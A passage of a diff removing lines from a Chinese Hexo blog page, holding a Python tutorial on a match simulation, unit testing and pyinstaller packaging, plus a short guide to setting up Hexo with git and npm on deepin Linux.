-                serving = &quot;B&quot;
-        else:
-            if random() &lt; probB:
-                sorceB += 1
-            else:
-                serving = &quot;A&quot;
-    return sorceA, sorceB</code></pre>
-<p>（9）上述代码中进一步设计了gameOver()函数，用来表示一场比赛结束的条件（首先达到15分的球员赢得一场比赛）。更新的结构图如下：</p>
-<p><img src="https://i.loli.net/2021/04/10/1Oo4GadYniS3P7V.png" alt="image-20210410130915968"></p>
-<p>（10）实现gameOver()函数，首先达到15分的球员赢得一场比赛，代码如下：</p>
-<pre><code class="python">def gameOver(a,b):
-    return a == 15 or b == 15</code></pre>
-<p>（11）最后是printSummary()函数，代码如下：</p>
-<pre><code class="python">def printSummary(winsA, winsB):
-    n = winsA + winsB
-    print(&quot;竞技分析开始，共模拟&#123;&#125;场比赛&quot;.format(n))
-    print(&quot;选手A获胜&#123;&#125;场比赛，占比&#123;:0.1%&#125;&quot;.format(winsA,winsA/n))
-    print(&quot;选手B火舌&#123;&#125;场比赛，占比&#123;:0.1%&#125;&quot;.format(winsB,winsB/n))</code></pre>
-<p>（12）将上述所有代码连接在一起，则形成了一个完整的代码：</p>
-<pre><code class="python">from random import random
-def printIntro():
-    print(&quot;这个程序模拟两个选手A和B的某种竞技比赛&quot;)
-    print(&quot;程序运行需要A和B的能力值(以0到1之间的小数表示)&quot;)
-def getInputs():
-    a = eval(input(&quot;请输入选手A的能力值（0-1）：&quot;))
-    b = eval(input(&quot;请输入选手B的能力值（0-1）：&quot;))
-    n = eval(input(&quot;模拟比赛的场次：&quot;))
-    return a, b, n
-def simNGames(n, probA, probB):
-    winsA, winsB = 0, 0
-    for i in range(n):
-        sorceA, sorceB = simOneGame(probA,probB)
-        if sorceA &gt; sorceB:
-            winsA += 1
-        else:
-            winsB += 1
-    return winsA, winsB
-def simOneGame(probA, probB):
-    sorceA, sorceB = 0, 0
-    serving = &quot;A&quot;
-    while not gameOver(sorceA,sorceB):
-        if serving == &quot;A&quot;:
-            if random() &lt; probA:
-                sorceA += 1
-            else:
-                serving = &quot;B&quot;
-        else:
-            if random() &lt; probB:
-                sorceB += 1
-            else:
-                serving = &quot;A&quot;
-    return sorceA, sorceB
-def gameOver(a,b):
-    return a == 15 or b == 15
-def printSummary(winsA, winsB):
-    n = winsA + winsB
-    print(&quot;竞技分析开始，共模拟&#123;&#125;场比赛&quot;.format(n))
-    print(&quot;选手A获胜&#123;&#125;场比赛，占比&#123;:0.1%&#125;&quot;.format(winsA,winsA/n))
-    print(&quot;选手B火舌&#123;&#125;场比赛，占比&#123;:0.1%&#125;&quot;.format(winsB,winsB/n))
-def main():
-    printIntro()
-    probA, probB, n = getInputs()
-    winsA, winsB = simNGames(n, probA, probB)
-    printSummary(winsA, winsB)
-main()</code></pre>
-<p>该程序运行结果如下：</p>
-<pre><code class="python">&gt;&gt;&gt;
-这个程序模拟两个选手A和B的某种竞技比赛
-程序运行需要A和B的能力值(以0到1之间的小数表示)
-请输入选手A的能力值（0-1）：0.45
-请输入选手B的能力值（0-1）：0.5
-模拟比赛的场次：1000
-竞技分析开始，共模拟1000场比赛
-选手A获胜369场比赛，占比36.9%
-选手B火舌631场比赛，占比63.1%</code></pre>
-<h4 id="3-设计过程总结"><a href="#3-设计过程总结" class="headerlink" title="3.设计过程总结"></a>3.设计过程总结</h4><p>自顶向下的设计过程从问题的输入输出开始，整体设计逐渐向下进行。<strong>每一层以大体算法描述开始，然后逐步细化成代码</strong>，细节被函数封装。该设计方法通过封装实现抽象，利用了<strong>模块化设计</strong>的思想。整个过程可以概括为以下4个步骤：</p>
-<ul>
-<li>步骤1：将算法表达为一系列小问题。</li>
-<li>步骤2：为每个小问题设计接口。</li>
-<li>步骤3：通过将算法表达为接口关联的多个小问题来细化算法。</li>
-<li>步骤4：为每个小问题重复上述过程。</li>
-</ul>
-<h3 id="自底向上执行"><a href="#自底向上执行" class="headerlink" title="自底向上执行"></a>自底向上执行</h3><p>（1）程序编写后，需要经过测试。</p>
-<ul>
-<li>小规模程序，直接运行即可</li>
-<li>大规模程序，则是将程序分成小部分逐个测试。</li>
-</ul>
-<p>（2）执行中等规模程序的最好方法是从结构图的最底层开始，而不是从顶部开始，然后逐步上升。或者说，<strong>先运行和测试每一个基本函数，再测试由基础函数组成的整体函数，这样有助于定位错误</strong>。以体育竞技分析为例，可以从gameOver()函数开始测试。</p>
-<p>（3）Python解释器提供import保留字辅助开展单元测试，语法格式如下：</p>
-<pre><code class="python">import &lt;源文件名称&gt;  #这里注意，import要求源文件名称中不能出现英文句号.</code></pre>
-<p>（4）在源文件的路径下打开cmd，运行python环境，对gameOver()函数进行单元测试如下：</p>
-<pre><code class="python">&gt;&gt;&gt; import matchAnalysis
-这个程序模拟两个选手A和B的某种竞技比赛
-程序运行需要A和B的能力值(以0到1之间的小数表示)
-请输入选手A的能力值（0-1）：0.45
-请输入选手B的能力值（0-1）：0.5
-模拟比赛的场次：1000
-竞技分析开始，共模拟1000场比赛
-选手A获胜374场比赛，占比37.4%
-选手B火舌626场比赛，占比62.6%
-&gt;&gt;&gt; matchAnalysis.gameOver(15,10)
-True
-&gt;&gt;&gt; matchAnalysis.gameOver(10,1)
-False</code></pre>
-<p>（5）根据gameOver的测试结果，说明gameOver()函数是正确的。可以进一步测试simOneGame()函数，代码如下：</p>
-<pre><code class="python">&gt;&gt;&gt; matchAnalysis.simOneGame(0.45,0.5)
-(10, 15)
-&gt;&gt;&gt; matchAnalysis.simOneGame(0.45,0.5)
-(9, 15)</code></pre>
-<p>（6）通过这样的<strong>单元测试</strong>可以检测程序中的每个函数，<strong>独立检验</strong>每个函数更容易发现错误。</p>
-<h2 id="pyinstaller库的使用"><a href="#pyinstaller库的使用" class="headerlink" title="pyinstaller库的使用"></a>pyinstaller库的使用</h2><h3 id="pyinstaller概述"><a href="#pyinstaller概述" class="headerlink" title="pyinstaller概述"></a>pyinstaller概述</h3><p>（1）pyinstaller是一个将Python语言脚本(.py文件)打包成可执行文件的第三方库，它能够在Windows、Linux、Mac OS X等操作系统下将Python源文件打包，<strong>通过对源文件打包，Python程序可以在没有安装Python的环境下运行，</strong>也可以作为一个独立文件方便传递和管理。</p>
-<p>（2）pyinstaller需要再命令行下用pip工具安装，代码如下：</p>
-<pre><code>pip3 install pyinstaller</code></pre>
-<p>（3）pyinstaller的官方网站网址为<a target="_blank" rel="noopener" href="http://www.pyinstaller.org/">http://www.pyinstaller.org</a></p>
-<p>（4）pyinstaller库会自动将pyinstaller命令安装到Python解释器目录中，与pip3命令路径相同，因此可以<strong>直接使用。</strong>在<strong>Windows平台的命令行</strong>中输入Python源文件名称，可以使用相对路径或绝对路径，代码如下：</p>
-<pre><code>pyinstaller hello.py  //pyinstaller不支持源文件名中有英文句号(.)存在
-或
-pyinstaller D:\Python\program\第一章\hello.py</code></pre>
-<p>（5）执行完毕后，<strong>源文件所在目录将生成dist和build两个文件夹。</strong>其中，</p>
-<ul>
-<li>build目录是pyinstaller存储临时文件的目录，可以安全删除。</li>
-<li><strong>最终打包程序在dist内部的dpython中。</strong>目录中的其他文件是可执行文件hello.exe的动态链接库。</li>
-</ul>
-<p>（6）<strong>可以通过-F参数对Python源文件生成一个独立的可执行文件</strong>，代码如下：</p>
-<pre><code>pyinstaller -F hello.py</code></pre>
-<p>（7）执行后<strong>在dist目录中出现了hello.exe文件，没有任何依赖库，执行它即可。</strong></p>
-<p>（8）使用pyinstaller库需要注意以下问题：</p>
-<ul>
-<li>文件路径中不能出现空格和英文句号(.)</li>
-<li>源文件必须是UTF-8编码，暂不支持其他编码类型。采用idle编写的源文件都保存为UTF-8编码形式，可直接使用。</li>
-</ul>
-<h4 id="扩展：动态链接"><a href="#扩展：动态链接" class="headerlink" title="扩展：动态链接"></a>扩展：<strong>动态链接</strong></h4><p>（1）动态链接提供了一种方法，能够使进程在运行时实际调用不属于其程序的代码。</p>
-<p>（2）如果其他代码由操作系统提供，则应用程序由于不包含这些代码而变得十分精简。</p>
-<p>（3）Windows平台提供大量的动态链接库，一般使用dll或ocx为扩展名。</p>
-<p>（4）静态链接与动态链接相对，指程序中自包含其所调用的所有代码，这使得程序可以在系统间移动而无需考虑库函数是否一致。</p>
-<h3 id="pyinstaller解析"><a href="#pyinstaller解析" class="headerlink" title="pyinstaller解析"></a>pyinstaller解析</h3><p>（1）pyinstaller的常用参数。</p>
-<table>
-<thead>
-<tr>
-<th align="center">参数</th>
-<th align="center">功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">-h, –help</td>
-<td align="center">查看帮助</td>
-</tr>
-<tr>
-<td align="center">-v, –version</td>
-<td align="center">查看pyinstaller版本</td>
-</tr>
-<tr>
-<td align="center">–clean</td>
-<td align="center">清理打包过程中的临时文件</td>
-</tr>
-<tr>
-<td align="center">-D, –onedir</td>
-<td align="center">默认值，生产dist目录</td>
-</tr>
-<tr>
-<td align="center">-F, –onefile</td>
-<td align="center">在dist文件夹中只生成独立的打包文件</td>
-</tr>
-<tr>
-<td align="center">-p DIR, –paths DIR</td>
-<td align="center">添加python文件使用的第三方库路径</td>
-</tr>
-<tr>
-<td align="center">-i &lt;.ico or .exe,ID or .icns&gt;,   -icon &lt;.ico or .exe,ID or .icns&gt;</td>
-<td align="center">指定打包程序使用的图标(icon)文件</td>
-</tr>
-</tbody></table>
-<p>（2）pyinstaller命令不需要在Python源文件中增加代码，只需通过命令行进行打包即可。</p>
-<p>（3）-F 参数最为常用，对于包含第三方库的源文件，可以使用-p添加第三方库所在路径。若第三方库由pip安装且在Python环境目录中，则不需要使用-p参数。</p>
-<p>（4）在生成的打包文件下执行代码</p>
-<pre><code>PS D:\Python\program\第一章\dist&gt; ./hello.exe
-Hello World</code></pre>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/04/08/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%B8%80)-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA01/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-deepin/deepin下搭建hexo博客" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/06/deepin/deepin%E4%B8%8B%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/">deepin下搭建hexo博客</a>
-    </h1>
-  
-
-        
-        <a href="/2021/04/06/deepin/deepin%E4%B8%8B%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/" class="archive-article-date">
-  	<time datetime="2021-04-06T08:17:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>（1）安装git</p>
-<pre><code>sudo apt install git</code></pre>
-<p>（2）安装npm</p>
-<pre><code>sudo apt install npm</code></pre>
-<p>（3）配置ssh key</p>
-<pre><code>git config --global user.name &quot;username&quot;   //username是你的GitHub用户名
-git config --global user.email &quot;XXXX@XX.com&quot;  //XXXX@XX.com 填你注册GitHub的邮箱
-ssh-keygen -t rsa -C &quot;XXXX@eXX.com&quot; //XXXX@XX.com 填你注册GitHub的邮箱，该步骤按3下回车初始化sshkey</code></pre>
-<p>最终会成生成一个文件在用户目录下(/home/username/.ssh)，找到id_rsa.pub文件，复制文件的内容。接着登陆github，依次点击：头像–&gt;Settings–&gt;SSH and GPG kyes –&gt;New SSH key将ssh key粘贴到github上，title可随意命名。</p>
-<pre><code>ssh -T git@github.com      //测试是否成功，注意邮箱地址不用改  
-/*
-如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到：
-Hi liuxianan! You&#39;ve successfully authenticated, but GitHub does not provide shell access.
-*/</code></pre>
-<p>（4）将npm换为国内源，使用阿里定制的cnpm命令行工具代替默认的npm</p>
-<pre><code>sudo npm install -g cnpm --registry=https://registry.npm.taobao.org</code></pre>
-<p>（5）安装hexo</p>
-<pre><code>sudo cnpm install -g hexo</code></pre>
-<p>（6）在电脑中新建一个hexo文件夹，在该文件夹下打开终端，初始化hexo</p>
-<pre><code>hexo init     //该命令执行完后会自动下载一些文件到当前路径下</code></pre>
-<p>接着把Windows中的hexo目录下的文件，从scaffolds开始的所有文件复制并替换到Linux下hexo目录下。</p>
-<pre><code>hexo g //生成静态页面
-hexo s //启动服务</code></pre>
-<p>（7）安装插件</p>
-<pre><code>sudo cnpm install hexo-deployer-git --save  </code></pre>
-<p>安装完插件后就可以使用如下命令提交改动的代码</p>
-<pre><code>hexo d</code></pre>
-<p>扩展：在Deepin 15.9.3系统中将/etc/NetworkManager/NetworkManager.conf文件中的下面两行前面加上#注释掉，即：</p>
-<p>#[connectivity]</p>
-<p>#uri=<a target="_blank" rel="noopener" href="http://packages.deepin.com/misc/check_network_status.txt">http://packages.deepin.com/misc/check_network_status.txt</a></p>
-<p>然后保存修改的NetworkManager.conf文件。</p>
-<p>2、在系统终端中重新启动网络</p>
-<p>运行以下命令：</p>
-<p>systemctl restart network-manager</p>
-<p>做完以上两步，通常情况下屏幕就可以调节色温了。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">deepin</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/04/06/deepin/deepin%E4%B8%8B%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/">展开全文 >></a>
         </p>
       
 
